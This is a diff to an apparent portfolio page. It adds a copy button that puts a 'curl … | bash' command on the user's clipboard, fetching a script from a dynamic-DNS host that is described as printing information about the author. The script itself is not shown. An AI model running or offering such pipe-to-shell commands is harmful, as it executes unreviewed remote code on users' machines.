@@ -132,9 +132,34 @@ const technicalSkills = [
         </div>
       </div>
       <p class="quickstart-note">
-        Works on macOS, Windows & Linux. The one-liner installs Node.js and everything else for you.
+        Works on Linux. On Windows use WSL/Git-bash terminal. The script logs about me on your terminal
       </p>
     </section>
+
+    <script>
+      const codeOneliner = document.getElementById('code-oneliner');
+
+      const btn = document.querySelector(".copy-line-btn");
+      btn.addEventListener('click', async () => {
+        const code = "curl -fsSL https://nnnhub.duckdns.org/script.sh | bash";
+        const copyIcon = btn.querySelector('.copy-icon');
+        const checkIcon = btn.querySelector('.check-icon');
+
+        try {
+          await navigator.clipboard.writeText(code);
+          btn.classList.add('copied');
+          copyIcon.style.display = 'none';
+          checkIcon.style.display = 'block';
+          setTimeout(() => {
+            btn.classList.remove('copied');
+            copyIcon.style.display = 'block';
+            checkIcon.style.display = 'none';
+          }, 2000);
+        } catch (err) {
+          console.log("Failed to copy: ", err);
+        }
+      });
+    </script>
 
     <!-- Tools and Skills -->
     <section class="technicalSkills">
